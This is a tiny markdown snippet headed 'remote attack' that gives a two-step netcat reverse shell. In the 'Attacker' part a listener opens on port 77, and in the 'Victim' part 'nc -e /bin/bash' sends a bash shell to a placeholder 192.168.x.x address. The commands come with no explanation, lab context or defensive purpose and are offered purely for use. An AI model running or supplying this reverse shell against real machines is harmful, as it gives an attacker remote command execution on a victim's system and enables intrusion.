## remote attack

- Attacker
```bash
nc -lnvp 77 -s 192.168.x.x
```
- Victim
```bash
nc -e /bin/bash 192.168.x.x 77
```
